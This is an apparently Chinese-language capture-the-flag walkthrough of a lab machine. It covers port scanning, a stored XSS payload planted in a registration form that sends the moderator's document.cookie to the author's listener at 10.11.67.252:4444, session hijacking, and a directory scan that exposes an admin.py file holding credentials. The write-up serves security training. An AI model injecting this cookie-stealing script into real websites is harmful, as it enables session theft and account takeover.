# Whats Your Name?

端口扫描

```shell
sudo nmap --min-rate 10000 -p- 10.10.9.65

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8081/tcp open  blackice-icecap
```

详细端口扫描

```shell
sudo nmap -sT -sV -sC -O -p22,80,8081 10.10.9.65

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1a:4f:b4:cf:87:ca:59:4b:f7:2d:58:7f:55:a1:75:fb (RSA)
|   256 a0:75:03:12:dc:5d:55:29:1a:2a:ba:a6:11:4d:8d:20 (ECDSA)
|_  256 4f:7e:8c:e8:7f:be:d4:16:90:1f:33:ea:f9:ee:b8:4c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Welcome
|_Requested resource was /public/html/
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

进入http://10.10.9.65:80网页

![image-20250207194834937](C:\Users\杨力\AppData\Roaming\Typora\typora-user-images\image-20250207194834937.png)

看到一个register，点击进入

![image-20250207194957416](C:\Users\杨力\AppData\Roaming\Typora\typora-user-images\image-20250207194957416.png)

随便填写资料后点击注册

![image-20250207195117293](C:\Users\杨力\AppData\Roaming\Typora\typora-user-images\image-20250207195117293.png)

注册成功

![image-20250207195230527](C:\Users\杨力\AppData\Roaming\Typora\typora-user-images\image-20250207195230527.png)

但登录的时候却告诉我们用户未经过验证

看到注册页面有这样一句话

You can now pre-register! Your details will be reviewed by the site moderator.

我们的注册信息会经过管理员的审核

也就是说我们的信息会展示在管理员的页面上，那么我们就可以尝试获取管理员的cookie

在注册信息中添加如下js代码

```javascript
<script>var i=new Image; i.src='http://10.11.67.252:4444/?'+document.cookie;</script>

var i = new Image;
创建一个 Image 对象，但不会将其添加到页面中。
Image 对象可以像 <img> 标签一样发送 HTTP 请求。

i.src = 'http://<IP>:<PORT>/?' + document.cookie;
设置图片的 src 地址，这个地址指向攻击者控制的服务器（http://<IP>:<PORT>/）。
document.cookie 获取当前网站的 Cookie，并将其拼接到 URL 中。
当浏览器尝试加载这张“图片”时，实际上会向攻击者服务器发送一个包含受害者 Cookie 的 HTTP 请求。
```

并搭建一个临时服务器

```
python -m http.server 4444
```

再次提交后，等待一会就可以拿到管理员的cookie

```
10.10.9.65 - - [07/Feb/2025 18:32:03] "GET /?PHPSESSID=aukqjdvtfnlie73ltgmf0nv9tm HTTP/1.1" 200 -
```

替换之后就进入到了管理员页面了

在进入到进入http://10.10.9.65:8081网页

直接打开看不到任何信息

进行目录扫描

```shell
sudo dirsearch -u 10.10.9.65:8081

301 -  321B  - /__pycache__  ->  http://10.10.9.65:8081/__pycache__/
200 -    5KB - /admin.py                                         
200 -  634B  - /assets/                                          
301 -  316B  - /assets  ->  http://10.10.9.65:8081/assets/       
302 -    0B  - /chat.php  ->  login.php                          
200 -    0B  - /db.php                                           
301 -  320B  - /javascript  ->  http://10.10.9.65:8081/javascript/
200 -  960B  - /login.php                                        
302 -    0B  - /logout.php  ->  login.php                        
200 -    0B  - /logs.txt                                         
301 -  320B  - /phpmyadmin  ->  http://10.10.9.65:8081/phpmyadmin/
200 -    3KB - /phpmyadmin/doc/html/index.html                   
200 -    3KB - /phpmyadmin/index.php                             
200 -    3KB - /phpmyadmin/
302 -    0B  - /profile.php  ->  login.php                                                       
200 -   96B  - /setup.php
```

找到了登录页面/login.php，同时发现了一个文件admin.py，下载下来后直接接找的到了管理员的登录用户名和密码

之后直接登录就进入到管理员页面了